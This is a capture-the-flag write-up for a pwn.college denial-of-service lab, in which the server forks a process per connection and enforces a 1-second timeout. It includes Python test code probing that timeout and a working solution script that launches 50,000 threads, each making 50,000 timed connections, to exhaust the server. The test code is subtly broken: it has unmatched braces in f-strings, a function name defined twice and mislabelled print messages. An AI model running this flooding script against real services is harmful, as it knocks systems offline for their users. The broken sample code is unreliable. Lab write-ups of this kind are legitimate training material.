# Problem statement:


The client at 10.0.0.3 is communicating with the server at 10.0.0.2 on port 31337. Deny this service.

This time the server forks a new process for each client connection, and limits each session to 1 second.

## Notes:
- Unlike DoS 2, the 1s timeout makes it easier to exhaust our resources than the server's unless we time things carefully.
- It was taking me an embarrassingly long amount of time to figure out the right timing just using a bash script, so I went and looked at the code
  https://github.com/pwncollege/intro-to-cybersecurity-dojo/blob/main/intercepting-communication/dos-3/run
- As the problem statement suggests, the key is the timeout. Looking at the source code, it is so simple that the only other variable to play around with is sending data.
  I decided to combine sending data + delays to understand how it actually behaves

### Understanding timeout's behaviour
  I tested all edge cases around a 1s timeout in the code below: 
    - No delay (As a baseline, even though we know this doesn't work. Otherwise, our solution for DoS 2 would be enough)
    - <1s delay
    - 1s delay
    - >1s delay (Even if the problem statement says 1s timeout, it's worth seeing how it behaves)

  What I noticed was:
  - No matter what combination of minuscule delays between when the connection is established and the first message sent, or in between messages, the third message always returns an error
     - The above means the server only receives one message and resets the connection (as we can see in the code) and probably means the second message is sent on our end but never delivered, and our OS becomes aware of the connection being closed in the third message (Broken pipe error, socket itself still open on our end)
     - The rest of messages aren't even sent on our end (Bad file descriptor error, now the socket is closed).
     - We can maximize the time the connection is open on the server by having exactly a 1s delay before sending the first message, although I thought this case would be handled the same as > 1s.
     
```
    import socket
    from time import sleep, time

    host = '10.0.0.2'
    port = 31337

    # Connect; send data right away in loop
    def test_immediate():
        s = time() # track start time
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((host, port))
        for i in range(0, 2):
            try:
                client.sendall(b"A" * 1024)
                print(f"\t Sent data in test_immediate()")
            except Exception as e:
                f = time()
                print(f"{e} || After {f - s} seconds")
                client.close()
        f = time()
        print(f"FINISHED || After {f - s} seconds")

    # Connect; delay < 1s; send, delay < 1s in loop
    def test_sleep2(job_id):
        s = time() # track start time
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((host, port))
        sleep(0.9) 
        for i in range(0,2):
            try:
                client.sendall(b"A" * 1024)
                print(f"\t {Sent data in test_sleep1()")
                sleep(0.9)
            except Exception as e:
                f = time()
                print(f"{e} || After {f - s} seconds")
                client.close()
        f = time()
        print(f"FINISHED || After {f - s} seconds")

    # Connect; delay = 1s; send, delay = 1s in loop
    def test_sleep1(job_id):
        s = time() # track start time
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((host, port))
        sleep(1) 
        for i in range(0,2):
            try:
                client.sendall(b"A" * 1024)
                print(f"\t {Sent data in test_sleep1()")
                sleep(1)
            except Exception as e:
                f = time()
                print(f"{e} || After {f - s} seconds")
                client.close()
        f = time()
        print(f"FINISHED || After {f - s} seconds")

    # Connect; delay > 1s; send, delay > 1s in loop
    def test_sleep2(job_id):
        s = time() # track start time
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((host, port))
        sleep(1.5) 
        for i in range(0,2):
            try:
                client.sendall(b"A" * 1024)
                print(f"\t {Sent data in test_sleep1()")
                sleep(1.5)
            except Exception as e:
                f = time()
                print(f"{e} || After {f - s} seconds")
                client.close()
        f = time()
        print(f"FINISHED || After {f - s} seconds")

    
```

## Solution:
  - Now that we know how to maximize the server's busy time with one connection, we can use threads to establish a bunch of connections in parallel.
  - I started with 500, then kept adding 0's. 
  - I also noticed based on the logs that my threads were chunking the processes spawned and child PIDs were being recycled, so instead of just using a thread for a single connection I decided to restart connections in the threads myself and  to save on fork() calls.
  - All the above to say, using 50k threads to connect 50k times in each is overkill, but it doesn't make sense to optimize more.
  - To run the code below and get the flag cleanly, redirect stdout and stderr:
    - `python test_timing.py > sockets.log 2> sockets_err.log`
  
```
import socket
from time import sleep, time
import threading

host = '10.0.0.2'
port = 31337

def test_sleep1(job_id):
    for i  in range(0, 50000):
        s = time()
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((host, port))
        sleep(1)
        for i in range(0,2): # just 1 send should be enough really
            try:
                client.sendall(b"A" * 1024)
                print(f"\t {[job_id]}Sent data on test_sleep1()")
                sleep(1)
            except Exception as e:
                f = time()
                print(f"{e} || After {f - s} seconds")
                client.close()

    f = time()
    print(f"FINISHED || After {f - s} seconds")

threads = []

for i in range(0, 50000):
    t = threading.Thread(target=test_sleep1, args=(i,))
    threads.append(t)

for t in threads:
    t.start()

for t in threads:
    t.join()
```
